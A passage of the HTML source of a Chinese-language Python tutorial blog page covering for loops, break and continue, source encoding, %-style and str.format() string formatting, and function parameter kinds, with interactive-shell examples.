href=\"#for-语句\">#</a> for 语句</h4>\n<p>Python for 循环可以遍历任何序列的项目，如一个列表或者一个字符串。</p>\n<p>for 循环的一般格式如下：</p>\n<pre><code>for &lt;variable&gt; in &lt;sequence&gt;:\n    &lt;statements&gt;\nelse:\n    &lt;statements&gt;\n</code></pre>\n<p>菜鸟教程执行流程图<img data-src=\"image003.jpg\" alt=\"\" /></p>\n<p>for 循环经常与 range () 函数结合使用<br />\n菜鸟教程链接：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9weXRob24vcHl0aG9uLWZ1bmMtcmFuZ2UuaHRtbA==\">range 函数</span></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#可以使用 range () 函数来创建一个列表：</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h4 id=\"break与continue\"><a class=\"anchor\" href=\"#break与continue\">#</a> break 与 continue</h4>\n<p>break 语句可以跳出 for 和 while 的循环体。如果你从 for 或 while 循环中终止，任何对应的循环 else 块将不执行。</p>\n<p>continue 语句被用来告诉 Python 跳过当前循环块中的剩余语句，然后继续进行下一轮循环。</p>\n<h2 id=\"字符串与编码\"><a class=\"anchor\" href=\"#字符串与编码\">#</a> 字符串与编码</h2>\n<p>字符串也是一种数据类型，但它涉及到编码问题，Python3 中默认使用的是 Unicode 编码。关于计算机编码的问题我已经解决了，在</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWxmLWZlcnJ5LmdpdGh1Yi5pby8yMDIwLzEyLzA5LyVFOCVBRSVBMSVFNyVBRSU5NyVFNiU5QyVCQSVFNyVCQyU5NiVFNyVBMCU4MSVFNCVCOCU4RSVFOCVCRiU5QiVFNSU4OCVCNi8=\">计算机编码与进制</span>一文中。</p>\n<p>由于 Python 源代码也是一个文本文件，所以，当你的源代码中包含中文的时候，在保存源代码时，就需要务必指定保存为 UTF-8 编码。当 Python 解释器读取源代码时，为了让它按 UTF-8 编码读取，我们通常在文件开头写上这两行：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/env python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr></table></figure><h2 id=\"字符串的格式化输出\"><a class=\"anchor\" href=\"#字符串的格式化输出\">#</a> 字符串的格式化输出</h2>\n<h3 id=\"的用法\"><a class=\"anchor\" href=\"#的用法\">#</a> % 的用法</h3>\n<p>1、整数的输出<br />\n % o —— oct 八进制<br />\n % d —— dec 十进制<br />\n % x —— hex 十六进制<br />\n 2、浮点数输出<br />\n（1）格式化输出<br />\n %<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1tLTJjYS5uZg==\">±m.nf</span><br />\n + 号可以省略，表示右对齐。- 号表示左对齐。m 表示占多少位，n 表示保留小数点后几位.</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"数字%6.6f\"</span> <span class=\"token operator\">%</span>  a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>数字<span class=\"token number\">6.900000</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"数字%6.2f\"</span> <span class=\"token operator\">%</span>  a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>数字  <span class=\"token number\">6.90</span></pre></td></tr></table></figure><p>% f —— 保留小数点后面六位有效数字<br />\n % e —— 保留小数点后面六位有效数字，指数形式输出<br />\n % g —— 在保证六位有效数字的前提下，使用小数方式，否则使用科学计数法<br />\n %.3g，保留 3 位有效数字，使用小数或科学计数法<br />\n字符串格式代码<img data-src=\"image002.png\" alt=\"\" /><br />\n常用转义字符<img data-src=\"image003.png\" alt=\"\" /></p>\n<h3 id=\"format的用法\"><a class=\"anchor\" href=\"#format的用法\">#</a> format 的用法</h3>\n<p>相对基本格式化输出采用‘%’的方法，format () 功能更强大，该函数把字符串当成一个模板，通过传入的参数进行格式化，并且使用大括号‘{}’作为特殊字符代替‘%’</p>\n<ol>\n<li>位置匹配<br />\n (1) 不带编号，即 “{}”<br />\n(2) 带数字编号，可调换顺序，即 “{1}”、“{2}”<br />\n(3) 带关键字，即 “{a}”、“{tom}”<br />\n(4) 通过下标或 key 匹配参数</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;&#125; &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 不带字段</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>hello world</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;0&#125; &#123;1&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 带数字编号</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>hello world</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;0&#125; &#123;1&#125; &#123;0&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 打乱顺序</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>hello world hello</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;1&#125; &#123;1&#125; &#123;0&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>world world hello</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;a&#125; &#123;tom&#125; &#123;a&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>tom<span class=\"token operator\">=</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span>a<span class=\"token operator\">=</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 带关键字</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>world hello world</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> coord <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'X: &#123;0[0]&#125;;  Y: &#123;0[1]&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>coord<span class=\"token punctuation\">)</span>  <span class=\"token comment\">#通过下标或 key</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token string\">'X: 3;  Y: 5'</span></pre></td></tr></table></figure><ol start=\"2\">\n<li>格式转换</li>\n</ol>\n<p>'b' - 二进制。将数字以 2 为基数进行输出。<br />\n'c' - 字符。在打印之前将整数转换成对应的 Unicode 字符串。<br />\n'd' - 十进制整数。将数字以 10 为基数进行输出。<br />\n'o' - 八进制。将数字以 8 为基数进行输出。<br />\n'x' - 十六进制。将数字以 16 为基数进行输出，9 以上的位数用小写字母。<br />\n'e' - 幂符号。用科学计数法打印数字。用 'e' 表示幂。<br />\n'g' - 一般格式。将数值以 fixed-point 格式输出。当数值特别大的时候，用幂形式打印。<br />\n'n' - 数字。当值为整数时和 'd' 相同，值为浮点数时和 'g' 相同。不同的是它会根据区域设置插入数字分隔符。<br />\n'%' - 百分数。将数值乘以 100 然后以 fixed-point ('f') 格式打印，值后面会有一个百分号。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;0:b&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">11</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:c&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\u0014</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:d&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">20</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:o&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">24</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:x&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">14</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:e&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">2.000000e+01</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:g&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token number\">20.1</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:f&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token number\">20.000000</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:n&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token number\">20</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:%&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token number\">2000.000000</span><span class=\"token operator\">%</span></pre></td></tr></table></figure><ol start=\"3\">\n<li>进阶用法<br />\n进制转换 (2 进制、8 进制、10 进制、16 进制)</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token comment\"># format also supports binary numbers</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">\"int: &#123;0:d&#125;;  hex: &#123;0:x&#125;;  oct: &#123;0:o&#125;;  bin: &#123;0:b&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">42</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token string\">'int: 42;  hex: 2a;  oct: 52;  bin: 101010'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token comment\"># with 0x, 0o, or 0b as prefix:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">\"int: &#123;0:d&#125;;  hex: &#123;0:#x&#125;;  oct: &#123;0:#o&#125;;  bin: &#123;0:#b&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">42</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 在前面加 “#”，则带进制前缀</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token string\">'int: 42;  hex: 0x2a;  oct: 0o52;  bin: 0b101010'</span></pre></td></tr></table></figure><ol start=\"4\">\n<li>左中右对齐及位数补全<br />\n (1)&lt; （默认）左对齐、&gt; 右对齐、^ 中间对齐、= （只用于数字）在小数点后进行补齐<br />\n (2) 取位数 “{:4s}”、&quot;{:.2f}&quot; 等</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;&#125; and &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 默认左对齐</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>hello <span class=\"token keyword\">and</span> world</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:10s&#125; and &#123;:>10s&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 取 10 位左对齐，取 10 位右对齐</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>hello      <span class=\"token keyword\">and</span>      world</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:^10s&#125; and &#123;:^10s&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 取 10 位中间对齐</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  hello    <span class=\"token keyword\">and</span>   world   </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;&#125; is &#123;:.2f&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">1.123</span><span class=\"token punctuation\">,</span><span class=\"token number\">1.123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 取 2 位小数</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">1.123</span> <span class=\"token keyword\">is</span> <span class=\"token number\">1.12</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;0&#125; is &#123;0:>10.2f&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">1.123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 取 2 位小数，右对齐，取 10 位</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">1.123</span> <span class=\"token keyword\">is</span>       <span class=\"token number\">1.12</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:&lt;30&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'left aligned'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 左对齐</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token string\">'left aligned                  '</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:>30&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'right aligned'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 右对齐</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token string\">'                 right aligned'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:^30&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'centered'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 中间对齐</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token string\">'           centered           '</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:*^30&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'centered'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 使用 “*” 填充</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token string\">'***********centered***********'</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span><span class=\"token string\">'&#123;:0=30&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 还有 “=” 只能应用于数字，这种方法可用 “>” 代替</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token string\">'000000000000000000000000000011'</span></pre></td></tr></table></figure><ol start=\"5\">\n<li>正负符号显示</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:+f&#125;; &#123;:+f&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">3.14</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">3.14</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 总是显示符号</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token string\">'+3.140000; -3.140000'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;: f&#125;; &#123;: f&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">3.14</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">3.14</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 若是 + 数，则在前面留空格</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token string\">' 3.140000; -3.140000'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:-f&#125;; &#123;:-f&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">3.14</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">3.14</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># - 数时显示 -，与 '&#123;:f&#125;; &#123;:f&#125;' 一致</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token string\">'3.140000; -3.140000'</span></pre></td></tr></table></figure><ol start=\"6\">\n<li>百分数 %</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> points <span class=\"token operator\">=</span> <span class=\"token number\">19</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> total <span class=\"token operator\">=</span> <span class=\"token number\">22</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'Correct answers: &#123;:.2%&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>points<span class=\"token operator\">/</span>total<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token string\">'Correct answers: 86.36%'</span></pre></td></tr></table></figure><ol start=\"7\">\n<li>时间</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">import</span> datetime</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> d <span class=\"token operator\">=</span> datetime<span class=\"token punctuation\">.</span>datetime<span class=\"token punctuation\">(</span><span class=\"token number\">2010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">58</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:%Y-%m-%d %H:%M:%S&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token string\">'2010-07-04 12:15:58'</span></pre></td></tr></table></figure><ol start=\"8\">\n<li>逗号 &quot;,&quot; 分隔金钱，以千进位</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:,&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">1234567890</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token string\">'1,234,567,890'</span></pre></td></tr></table></figure><h2 id=\"函数\"><a class=\"anchor\" href=\"#函数\">#</a> 函数</h2>\n<p>函数文档__doc__() 调用</p>\n<h3 id=\"参数\"><a class=\"anchor\" href=\"#参数\">#</a> 参数</h3>\n<p>参数定义的顺序必须是：必选参数、默认参数、可变参数、命名关键字参数和关键字参数。</p>\n<p>a. 形参：形式参数，没有实际作用<br />\n①必备参数：也加位置参数，用户调用函数时，必须要传入的参数</p>\n<p>② 缺省参数：用户调用函数时，可以不用传入的参数 eg.def a (a1=1,a2=2) <em><strong>定义默认参数要牢记一点：默认参数必须指向不变对象！</strong></em>  <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTAxNjk1OTY2MzYwMjQwMC8xMDE3MjYxNjMwNDI1ODg4\">https://www.liaoxuefeng.com/wiki/1016959663602400/1017261630425888</span> 中有详细介绍。</p>\n<p>③关键字参数：用户调用函数时，必须通过 “形参名 = 实参名 / 值” 格式传入的参数  eg. def a (a1,a2) a (a1=1,a2=2) →函数调用</p>\n<p>定义命名的关键字参数在没有可变参数的情况下不要忘了写分隔符 *，否则定义的将是位置参数。</p>\n<p>④不定长参数</p>\n<ol>\n<li>\n<p>*args：接收任意多个单值，组成一个元组</p>\n</li>\n<li>\n<p>**kwargs：接收任意多个键值对，组成一个字典</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> age<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'name:'</span><span 